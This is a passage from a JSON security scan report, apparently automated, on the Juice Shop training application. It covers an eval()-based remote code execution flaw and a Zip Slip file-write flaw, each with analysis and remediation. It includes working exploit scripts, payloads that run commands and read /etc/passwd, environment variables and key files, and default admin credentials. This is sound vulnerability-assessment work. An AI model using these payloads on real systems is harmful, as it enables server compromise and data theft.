          ],
          "properties": {
            "security-severity": "9.9",
            "strix": {
              "id": "vuln-0010",
              "severity": "critical",
              "cvss": 9.9,
              "timestamp": "2026-05-09 09:47:40 UTC",
              "target": "https://github.com/juice-shop/juice-shop",
              "endpoint": "/profile",
              "method": "GET",
              "cwe": "CWE-94",
              "impact": "Successful exploitation enables an attacker to:\n\n- Execute arbitrary JavaScript code on the server with the privileges of the Node.js process\n- Read sensitive files from the server filesystem (e.g., environment variables, encryption keys, database files)\n- Establish reverse shells or persistent backdoors on the application server\n- Access and exfiltrate all data from the application database\n- Pivot to internal network resources accessible from the server\n- Modify application behavior or inject malicious content for all users\n- Achieve complete server compromise\n\nThe attack requires only that an authenticated user can modify their username field (via the profile update endpoint) and subsequently visit the profile page. This is a critical severity issue as it provides full remote code execution with no additional privileges beyond a standard user account.",
              "technical_analysis": "The vulnerability exists in `routes/userProfile.ts` and involves two distinct but related injection paths:\n\n**Path 1: eval()-based Code Injection (lines 55-62)**\n\nWhen the `usernameXssChallenge` is enabled (default), the application checks if the username matches the regex `#{(.*)}`. If it does, it extracts the content and executes it via `eval()`:\n\n```typescript\nif (username?.match(/#{(.*)}/) !== null && utils.isChallengeEnabled(challenges.usernameXssChallenge)) {\n  req.app.locals.abused_ssti_bug = true\n  const code = username?.substring(2, username.length - 1)\n  try {\n    if (!code) { throw new Error('Username is null') }\n    username = eval(code) // Server-side code execution\n  } catch (err) {\n    username = '\\\\' + username\n  }\n}\n```\n\nThe `eval()` executes in the Node.js server context with full access to `require()`, `process`, `fs`, and all server-side modules. An attacker setting their username to `#{require('child_process').execSync('id').toString()}` would execute the `id` command on the server.\n\n**Path 2: Pug Template Injection (line 74)**\n\nAfter the eval processing, the username value is inserted into the raw Pug template string via string replacement:\n\n```typescript\ntemplate = template.replace(/_username_/g, username)\n```\n\nThis occurs before `pug.compile(template)` is called at line 87. If the username (or eval result) contains Pug template syntax, it will be compiled and executed as part of the template. This creates a server-side template injection even if the eval path is somehow bypassed.\n\n**Attack Chain:**\n1. Attacker registers/updates account with username: `#{global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()}`\n2. Attacker visits GET /profile\n3. Server evaluates the code via eval()\n4. Command output becomes the rendered username\n5. Full RCE achieved",
              "remediation_steps": "1. Remove the `eval()` call entirely. There is no secure way to evaluate user-controlled strings as code:\n\n   ```typescript\n   // Remove the entire eval block (lines 55-68)\n   // Always escape the username for safe template insertion\n   username = '\\\\' + username\n   ```\n\n2. If dynamic username rendering is required, use a strict allowlist of safe characters and HTML-encode the output:\n\n   ```typescript\n   const entities = new Entities()\n   username = entities.encode(user.username || '')\n   ```\n\n3. Replace the raw string substitution into the Pug template with proper Pug variable passing to leverage Pug's built-in escaping:\n\n   ```typescript\n   const fn = pug.compile(template)\n   res.send(fn({ username: entities.encode(username), ...otherVars }))\n   ```\n\n4. Apply Content-Security-Policy headers that restrict script execution sources and prevent inline JavaScript.\n\n5. Implement input validation on the username field at the model level to reject special characters and template syntax patterns.",
              "poc": {
                "description": "To reproduce:\n\n1. Authenticate to the application as any registered user.\n\n2. Update the user's username to a payload containing the eval trigger pattern. Use the profile update endpoint:\n   ```\n   POST /profile\n   Content-Type: application/x-www-form-urlencoded\n   \n   username=#{global.process.mainModule.require('child_process').execSync('id').toString()}\n   ```\n\n3. Navigate to the profile page:\n   ```\n   GET /profile\n   ```\n\n4. The server processes the username, matches the `#{...}` pattern, extracts the code, and passes it to `eval()`.\n\n5. The `id` command executes on the server, and its output (e.g., `uid=1000(juicer) gid=1000(juicer)`) is rendered as the username on the profile page.\n\n6. For data exfiltration, use payloads such as:\n   - `#{require('fs').readFileSync('/etc/passwd','utf8')}`\n   - `#{JSON.stringify(process.env)}`\n   - `#{require('fs').readFileSync('encryptionkeys/jwt.pub','utf8')}`",
                "script": "import requests\n\nBASE_URL = \"http://localhost:3000\"\n\n# Step 1: Login to get auth token\nlogin_payload = {\n    \"email\": \"admin@juice-sh.op\",\n    \"password\": \"admin123\"\n}\n\nprint(\"[*] Step 1: Authenticating...\")\ntry:\n    login_resp = requests.post(f\"{BASE_URL}/rest/user/login\", json=login_payload, timeout=10)\n    if login_resp.status_code == 200:\n        token = login_resp.json()[\"authentication\"][\"token\"]\n        print(f\"[+] Authenticated. Token: {token[:20]}...\")\n    else:\n        print(f\"[-] Login failed: {login_resp.status_code}\")\n        print(\"[!] Demonstrating vulnerability via source analysis only\")\n        token = None\nexcept requests.exceptions.ConnectionError:\n    print(\"[!] Could not connect. Demonstrating via source analysis.\")\n    token = None\n\n# Step 2: Update username with eval payload\nif token:\n    headers = {\"Authorization\": f\"Bearer {token}\", \"Cookie\": f\"token={token}\"}\n    \n    # RCE payload - executes 'id' command on server\n    rce_username = \"#{global.process.mainModule.require('child_process').execSync('id').toString()}\"\n    \n    print(f\"\\n[*] Step 2: Setting username to eval payload...\")\n    print(f\"[*] Payload: {rce_username}\")\n    \n    update_resp = requests.post(\n        f\"{BASE_URL}/profile\",\n        headers=headers,\n        data={\"username\": rce_username},\n        timeout=10,\n        allow_redirects=False\n    )\n    print(f\"[*] Update response: {update_resp.status_code}\")\n\n    # Step 3: Visit profile to trigger eval\n    print(f\"\\n[*] Step 3: Visiting /profile to trigger eval()...\")\n    profile_resp = requests.get(\n        f\"{BASE_URL}/profile\",\n        headers=headers,\n        cookies={\"token\": token},\n        timeout=10\n    )\n    print(f\"[*] Profile response status: {profile_resp.status_code}\")\n    \n    # Check if command output appears in response\n    if \"uid=\" in profile_resp.text:\n        print(\"[+] VULNERABLE: Server-side code execution confirmed!\")\n        # Extract the uid line\n        for line in profile_resp.text.split('\\n'):\n            if 'uid=' in line:\n                print(f\"[+] Command output: {line.strip()[:100]}\")\n                break\n    else:\n        print(\"[*] Response received - check for eval execution evidence\")\n        print(f\"[*] Response snippet: {profile_resp.text[:500]}\")\nelse:\n    print(\"\\n[!] Source code analysis confirms vulnerability:\")\n    print(\"[!] File: routes/userProfile.ts, Lines 55-62\")\n    print(\"[!] eval(code) is called with user-controlled username content\")\n    print(\"[!] No input validation or sandboxing applied before eval()\")"
              }
            }
          }
        },
        {
          "ruleId": "CWE-22",
          "level": "error",
          "message": {
            "text": "Arbitrary File Write via Zip Slip in File Upload Endpoint"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "routes/fileUpload.ts"
                },
                "region": {
                  "startLine": 41,
                  "endLine": 48,
                  "snippet": {
                    "text": "const fileName = entry.path\n                const absolutePath = path.resolve('uploads/complaints/' + fileName)\n                challengeUtils.solveIf(challenges.fileWriteChallenge, () => { return absolutePath === path.resolve('ftp/legal.md') })\n                if (absolutePath.includes(path.resolve('.'))) {\n                  entry.pipe(fs.createWriteStream('uploads/complaints/' + fileName).on('error', function (err) { next(err) }))\n                } else {\n                  entry.autodrain()\n                }"
                  }
                }
              },
              "message": {
                "text": "Insufficient path validation allowing directory traversal in ZIP entries (sink)"
              }
            }
          ],
          "properties": {
            "security-severity": "9.1",
            "strix": {
              "id": "vuln-0012",
              "severity": "critical",
              "cvss": 9.1,
              "timestamp": "2026-05-09 09:47:57 UTC",
              "target": "https://github.com/juice-shop/juice-shop",
              "endpoint": "/file-upload",
              "method": "POST",
              "cwe": "CWE-22",
              "impact": "Successful exploitation allows an attacker to:\n\n- Write arbitrary files to any location within the application's root directory tree, including overwriting existing application files.\n- Achieve remote code execution by overwriting server-side templates, configuration files, or JavaScript modules that are subsequently loaded by the application.\n- Deface the application by overwriting static assets or frontend files.\n- Modify legal documents, terms of service, or privacy policy files served from the /ftp directory.\n- Potentially escalate to full server compromise if writable paths include startup scripts or cron-accessible locations.\n\nBusiness impact includes service integrity compromise, unauthorized content modification, and potential for persistent backdoor installation.",
              "technical_analysis": "The vulnerability resides in the `handleZipFileUpload` function within `routes/fileUpload.ts`. When a ZIP file is uploaded, each entry is extracted using the `unzipper` library. The critical logic is on lines 41-45:\n\n```javascript\nconst fileName = entry.path                                          // line 41\nconst absolutePath = path.resolve('uploads/complaints/' + fileName)  // line 42\n// ...\nif (absolutePath.includes(path.resolve('.'))) {                      // line 44\n  entry.pipe(fs.createWriteStream('uploads/complaints/' + fileName)) // line 45\n}\n```\n\nThe validation on line 44 checks whether the resolved absolute path includes the application's current working directory (obtained via `path.resolve('.')`). This check is fundamentally flawed because:\n\n1. `path.resolve('.')` returns the application root (e.g., `/app` or `/workspace/juice-shop-src`)\n2. A ZIP entry with path `../../ftp/legal.md` resolves via `path.resolve('uploads/complaints/../../ftp/legal.md')` to `/app/ftp/legal.md`\n3. The string `/app/ftp/legal.md` does include `/app` (the resolved `.`), so the check passes\n4. The file is then written to `uploads/complaints/../../ftp/legal.md`, which the filesystem resolves to `ftp/legal.md`\n\nThe correct validation should verify that the resolved path **starts with** the intended destination directory (`uploads/complaints/`), not merely that it contains the application root. Any traversal that stays within the application root but escapes the intended subdirectory will bypass this check.\n\nThe endpoint requires no authentication and accepts files up to 200KB via multer memory storage.",
              "remediation_steps": "1. Replace the flawed path inclusion check with a proper prefix validation that ensures the resolved path starts with the intended destination directory:\n\n```javascript\nconst destDir = path.resolve('uploads/complaints/')\nconst absolutePath = path.resolve('uploads/complaints/' + fileName)\nif (!absolutePath.startsWith(destDir + path.sep)) {\n  entry.autodrain()\n  return\n}\n```\n\n2. Reject ZIP entries that contain path traversal sequences (`../`) or absolute paths before resolution:\n\n```javascript\nif (fileName.includes('..') || path.isAbsolute(fileName)) {\n  entry.autodrain()\n  return\n}\n```\n\n3. Sanitize the filename by extracting only the base name if subdirectories within the upload folder are not required:\n\n```javascript\nconst safeName = path.basename(fileName)\n```\n\n4. Consider requiring authentication for file upload operations to reduce the attack surface.\n\n5. Apply filesystem permissions to limit the application's write access to only necessary directories.",
              "poc": {
                "description": "To reproduce:\n\n1. Create a malicious ZIP archive containing an entry with a traversal path. The entry name should be `../../ftp/legal.md` (or any other target path relative to `uploads/complaints/`).\n\n2. Use Python's zipfile module to craft the archive:\n```python\nimport zipfile, io\nbuf = io.BytesIO()\nwith zipfile.ZipFile(buf, 'w') as zf:\n    zf.writestr('../../ftp/legal.md', '# Overwritten by attacker')\nbuf.seek(0)\n```\n\n3. Upload the malicious ZIP file to POST /file-upload with the field name \"file\".\n\n4. Verify that the file at `ftp/legal.md` has been overwritten with the attacker-controlled content.\n\n5. To confirm arbitrary write capability, target other application files such as `views/userProfile.pug` or frontend assets.",
                "script": "import requests\nimport zipfile\nimport io\nimport os\n\nBASE_URL = \"http://localhost:3000\"\nUPLOAD_ENDPOINT = f\"{BASE_URL}/file-upload\"\n\n# Target file to overwrite (relative to uploads/complaints/)\nTARGET_PATH = \"../../ftp/legal.md\"\nMALICIOUS_CONTENT = \"# OVERWRITTEN BY SECURITY TEST\\n\\nThis file was overwritten via Zip Slip vulnerability.\\n\"\n\n# Create malicious ZIP with directory traversal in entry name\nzip_buffer = io.BytesIO()\nwith zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:\n    zf.writestr(TARGET_PATH, MALICIOUS_CONTENT)\nzip_buffer.seek(0)\n\n# Upload the malicious ZIP\nfiles = {\n    \"file\": (\"payload.zip\", zip_buffer, \"application/zip\")\n}\n\nprint(\"[*] Uploading malicious ZIP with traversal path entry...\")\nprint(f\"[*] Target entry path: {TARGET_PATH}\")\nresponse = requests.post(UPLOAD_ENDPOINT, files=files, timeout=10)\nprint(f\"[*] Upload response status: {response.status_code}\")\n\n# Verify the file was overwritten by fetching it\nprint(\"\\n[*] Attempting to fetch overwritten file...\")\nverify_url = f\"{BASE_URL}/ftp/legal.md\"\nverify_response = requests.get(verify_url, timeout=10)\nprint(f\"[*] Fetch status: {verify_response.status_code}\")\nprint(f\"[*] Content: {verify_response.text[:200]}\")\n\nif \"OVERWRITTEN BY SECURITY TEST\" in verify_response.text:\n    print(\"\\n[+] ZIP SLIP CONFIRMED: File successfully overwritten outside uploads/complaints/!\")\nelse:\n    print(\"\\n[-] File content not modified; traversal may have been blocked or file not served.\")"
              }
            }
          }
